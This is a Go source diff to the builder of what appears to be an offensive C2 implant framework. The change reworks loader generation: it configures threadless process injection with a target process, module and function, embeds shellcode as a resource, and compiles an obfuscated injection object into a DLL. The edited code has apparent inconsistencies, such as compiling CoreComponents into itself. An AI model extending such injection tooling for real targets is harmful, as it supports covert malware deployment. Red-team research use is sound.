@@ -127,58 +127,55 @@ func (h *HexaneConfig) GetInjectMethod() InjectConfig {
 	var InjectCfg InjectConfig
 
 	if h.Implant.Injection.Threadless != nil {
-
-		InjectCfg.InjectMethod = h.Implant.Injection.Threadless.LdrExecute
+		InjectCfg.InjectMethod = h.Implant.Injection.Threadless.Execute
+		InjectCfg.InjectObject = h.Compiler.BuildDirectory + "/" + filepath.Base(InjectCfg.InjectMethod) + ".o"
 		InjectCfg.InjectConfig = map[string][]byte{
 			"OBF_KEY": h.Key,
 			"PARENT":  []byte(h.Implant.Injection.Threadless.ProcName),
 			"MODULE":  []byte(h.Implant.Injection.Threadless.ModuleName),
 			"FUNC":    []byte(h.Implant.Injection.Threadless.FuncName),
 		}
+	} else if h.Implant.Injection.Threadpool != nil {
+		// TP
 	}
 
 	return InjectCfg
 }
 
 func (h *HexaneConfig) GenerateLoader() error {
-	var (
-		err 			error
-		InjectMethod 	string
-	)
+	var err error
 
 	InjectCfg := h.GetInjectMethod()
 	RsrcObj := h.Compiler.BuildDirectory + "/resource.res"
 	RsrcData := h.Compiler.BuildDirectory + "/shellcode.bin"
 	LoaderObj := h.Compiler.BuildDirectory + "/loader.asm.o"
 	LoaderData := h.Compiler.BuildDirectory + "/loader.bin"
-	InjectObj := h.Compiler.BuildDirectory + "/" + filepath.Base(InjectMethod) + ".o"
 	CoreComponents := h.Compiler.BuildDirectory + "/ldrcore.cpp.o"
 	Output := h.Compiler.BuildDirectory + "/" + h.ImplantName + h.Compiler.FileExtension
 
-	if err = h.RunCommand(h.Compiler.Windres + " -O coff " + RsrcScript + " -DBUILDPATH=\"" + RsrcData + "\" -o " + RsrcObj); err != nil {
+	if err = h.RunCommand(h.Compiler.Windres + " -O coff " + RsrcScript + " -DRSRCDATA=\"" + RsrcData + "\" -o " + RsrcObj); err != nil {
 		return err
 	}
 
-	if err = h.RunCommand(h.Compiler.Objcopy + " -j .text -O binary " + LoaderObj + " " + LoaderData); err == nil {
-		// TODO: change this from preproc-def to embeded in section config
-		if InjectCfg.InjectConfig["LOADER"], err = os.ReadFile(LoaderData); err != nil {
-			return err
-		}
-	} else {
+	if err = h.RunCommand(h.Compiler.Objcopy + " -j .text -O binary " + LoaderObj + " " + LoaderData); err != nil {
 		return err
 	}
 
-	WrapMessage("INF", fmt.Sprintf("generating object file for %s", InjectMethod))
-	if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{InjectMethod}, nil, h.Compiler.IncludeDirs, InjectObj, h.Key); err != nil {
+	// TODO: change this from preproc-def to embeded in section config
+	// tbh none of this should be preproc-defs
+	if InjectCfg.InjectConfig["LOADER"], err = os.ReadFile(LoaderData); err != nil {
 		return err
 	}
 
-	if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{LoadersCpp, InjectObj}, nil, h.Compiler.IncludeDirs, CoreComponents, h.Key); err != nil {
+	if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{InjectCfg.InjectMethod}, nil, h.Compiler.IncludeDirs, InjectCfg.InjectObject, h.Key); err != nil {
 		return err
 	}
 
+	if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{CoreComponents, InjectCfg.InjectObject}, nil, h.Compiler.IncludeDirs, CoreComponents, h.Key); err != nil {
+		return err
+	}
 
-	if err = h.CompileObject(h.Compiler.Mingw, LoaderComponents, []string{"-shared"}, h.Compiler.IncludeDirs, Output, h.Key); err != nil {
+	if err = h.CompileObject(h.Compiler.Mingw, Components, []string{"-shared"}, h.Compiler.IncludeDirs, Output, h.Key); err != nil {
 		return err
 	}
 
